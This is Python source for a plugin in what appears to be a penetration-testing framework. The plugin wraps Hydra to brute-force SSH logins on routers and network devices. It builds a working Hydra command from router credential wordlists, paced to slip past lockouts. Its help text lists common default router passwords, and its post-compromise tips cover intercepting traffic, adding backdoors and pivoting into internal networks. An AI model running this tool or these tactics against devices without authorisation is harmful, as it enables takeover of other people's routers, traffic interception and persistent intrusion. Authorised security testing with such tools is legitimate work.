#!/usr/bin/env python3
"""
souleyez.plugins.router_ssh_brute

Router SSH brute force plugin using Hydra.
Targets routers with SSH management enabled.
"""

import subprocess
import time
from typing import List

from souleyez.security.validation import ValidationError, validate_target

from .plugin_base import PluginBase

HELP = {
    "name": "Router SSH Brute — SSH Login Attack",
    "description": (
        "Brute force router SSH login with common credentials.\n\n"
        "Many routers (especially enterprise/prosumer) have SSH enabled:\n"
        "- MikroTik, Ubiquiti, Cisco, Juniper\n"
        "- Some consumer routers with advanced firmware\n"
        "- DD-WRT, OpenWRT, Tomato custom firmware\n\n"
        "This plugin uses Hydra to test router SSH credentials.\n\n"
        "Quick tips:\n"
        "- Use low thread count (1-2) to avoid lockouts\n"
        "- Add delay between attempts\n"
        "- Some routers use non-standard SSH ports\n"
        "- Check for key-only auth before wasting time\n"
    ),
    "usage": "souleyez jobs enqueue router_ssh_brute <target>",
    "examples": [
        "souleyez jobs enqueue router_ssh_brute 192.168.1.1",
        'souleyez jobs enqueue router_ssh_brute 192.168.1.1 --args "--port 2222"',
    ],
    "flags": [
        ["--port PORT", "SSH port (default: 22)"],
    ],
    "presets": [
        {"name": "Standard SSH", "args": [], "desc": "Port 22 with router credentials"},
        {
            "name": "Alternate Port",
            "args": ["--port", "2222"],
            "desc": "Non-standard SSH port",
        },
    ],
    "help_sections": [
        {
            "title": "What is Router SSH Brute Force?",
            "color": "cyan",
            "content": [
                (
                    "Overview",
                    [
                        "Brute forces SSH login on routers and network devices",
                        "Uses Hydra with router-specific credential lists",
                        "Targets management interface for full device control",
                    ],
                ),
                (
                    "Common Targets",
                    [
                        "MikroTik, Ubiquiti, Cisco, Juniper devices",
                        "Consumer routers with SSH (Asus, Netgear with custom FW)",
                        "DD-WRT, OpenWRT, Tomato firmware",
                        "Managed switches with SSH enabled",
                    ],
                ),
            ],
        },
        {
            "title": "Usage & Examples",
            "color": "green",
            "content": [
                (
                    "Basic Usage",
                    [
                        "souleyez jobs enqueue router_ssh_brute 192.168.1.1",
                        "  → Tests default router credentials on port 22",
                    ],
                ),
                (
                    "Alternate Port",
                    [
                        'souleyez jobs enqueue router_ssh_brute 192.168.1.1 --args "--port 2222"',
                        "  → Tests on custom SSH port",
                    ],
                ),
            ],
        },
        {
            "title": "Tips & Common Defaults",
            "color": "yellow",
            "content": [
                (
                    "Common Router Credentials",
                    [
                        "admin:admin, root:root, ubnt:ubnt",
                        "admin:password, admin:1234, cisco:cisco",
                        "admin:<blank>, root:<blank>",
                    ],
                ),
                (
                    "Before Attacking",
                    [
                        "Use low threads (-t 1 or -t 2) to avoid lockouts",
                        "Many routers block after 3-5 failed attempts",
                        "Check for key-only auth first (wastes time otherwise)",
                        "Some routers use non-standard ports (2222, 22222)",
                    ],
                ),
                (
                    "After Success",
                    [
                        "Full command-line access to router",
                        "Can modify routing, DNS, firewall rules",
                        "Intercept/redirect traffic, add backdoors",
                        "Pivot to internal network segments",
                    ],
                ),
            ],
        },
    ],
}


class RouterSSHBrutePlugin(PluginBase):
    name = "Router SSH Brute"
    tool = "hydra"
    category = "exploitation"
    HELP = HELP

    def _get_wordlist_path(self, filename: str) -> str:
        """Get path to wordlist file."""
        from souleyez.wordlists import resolve_wordlist_path

        return resolve_wordlist_path(f"data/wordlists/{filename}")

    def build_command(
        self, target: str, args: List[str] = None, label: str = "", log_path: str = None
    ):
        """Build Hydra command for router SSH brute force."""
        args = args or []

        try:
            target = validate_target(target)
        except ValidationError as e:
            if log_path:
                with open(log_path, "w") as f:
                    f.write(f"ERROR: Invalid target: {e}\n")
            return None

        port = "22"
        i = 0
        while i < len(args):
            if args[i] == "--port" and i + 1 < len(args):
                port = args[i + 1]
                i += 2
            else:
                i += 1

        users = self._get_wordlist_path("router_users.txt")
        passwords = self._get_wordlist_path("router_passwords.txt")

        cmd = [
            "hydra",
            "-L",
            users,
            "-P",
            passwords,
            "-s",
            port,
            "-t",
            "1",  # Single thread for SSH
            "-w",
            "5",  # 5 second delay
            "-vV",
            "-f",
            target,
            "ssh",
        ]

        return {"cmd": cmd, "timeout": 3600}

    def run(
        self, target: str, args: List[str] = None, label: str = "", log_path: str = None
    ) -> int:
        """Execute router SSH brute force."""
        cmd_spec = self.build_command(target, args, label, log_path)
        if cmd_spec is None:
            return 1

        cmd = cmd_spec["cmd"]

        if log_path:
            with open(log_path, "w") as f:
                f.write(f"# Router SSH Brute Force on {target}\n")
                f.write(f"# Command: {' '.join(cmd)}\n")
                f.write(f"# Started: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")

        try:
            with open(log_path, "a") as f:
                result = subprocess.run(
                    cmd, stdout=f, stderr=subprocess.STDOUT, timeout=cmd_spec["timeout"]
                )
            return result.returncode
        except subprocess.TimeoutExpired:
            if log_path:
                with open(log_path, "a") as f:
                    f.write("\n\n# ERROR: Brute force timed out\n")
            return 124
        except Exception as e:
            if log_path:
                with open(log_path, "a") as f:
                    f.write(f"\n\n# ERROR: {e}\n")
            return 1


plugin = RouterSSHBrutePlugin()
